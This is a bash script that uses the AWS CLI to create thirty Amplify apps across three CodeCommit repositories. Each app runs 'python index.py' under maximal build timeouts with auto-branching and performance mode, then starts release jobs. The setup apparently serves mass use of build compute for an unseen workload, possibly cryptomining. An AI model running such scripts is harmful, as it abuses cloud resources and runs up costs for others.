#!/usr/bin/env bash

create_app(){
for i in {1..10}; do
  aws amplify create-app --name task$i  --repository $REPO  --platform WEB  --iam-service-role-arn $IAM --environment-variables '{"_BUILD_TIMEOUT":"480"}' --enable-branch-auto-build  --no-enable-branch-auto-deletion  --no-enable-basic-auth --build-spec "
version: 1
frontend:
  phases:
    build:
      commands: 
      - yum install sudo -y
      - python index.py
  artifacts:
    baseDirectory: /
    files:
      - '**/*'
  cache:
    paths: []
" --enable-auto-branch-creation --auto-branch-creation-patterns '["*","*/**"]' --auto-branch-creation-config '{"stage": "PRODUCTION",  "enableAutoBuild": true,  "environmentVariables": {" ": " "},"enableBasicAuth": false, "enablePerformanceMode": true,  "enablePullRequestPreview":false}'
done
}

REPO=$(aws codecommit get-repository --repository-name test --query 'repositoryMetadata.cloneUrlHttp'| tr -d '"' 2> /dev/null)
IAM=$(aws iam get-role --role-name AWSCodeCommit-Role --query 'Role.Arn'| tr -d '"' 2> /dev/null)
create_app

REPO=$(aws codecommit get-repository --repository-name test1 --query 'repositoryMetadata.cloneUrlHttp'| tr -d '"' 2> /dev/null)
IAM=$(aws iam get-role --role-name AWSCodeCommit-Role --query 'Role.Arn'| tr -d '"' 2> /dev/null)
create_app

REPO=$(aws codecommit get-repository --repository-name test2 --query 'repositoryMetadata.cloneUrlHttp'| tr -d '"' 2> /dev/null)
IAM=$(aws iam get-role --role-name AWSCodeCommit-Role --query 'Role.Arn'| tr -d '"' 2> /dev/null)
create_app

for i in {0..29}; do
  APPID=$(aws amplify list-apps --output json --query 'apps['$i'].appId'| tr -d '"' 2> /dev/null)
  aws amplify create-branch --app-id $APPID --stage PRODUCTION --branch-name master --enable-performance-mode --enable-auto-build --environment-variables '{"_BUILD_TIMEOUT":"480"}'
  aws amplify start-job --app-id $APPID --branch-name master --job-type RELEASE
done
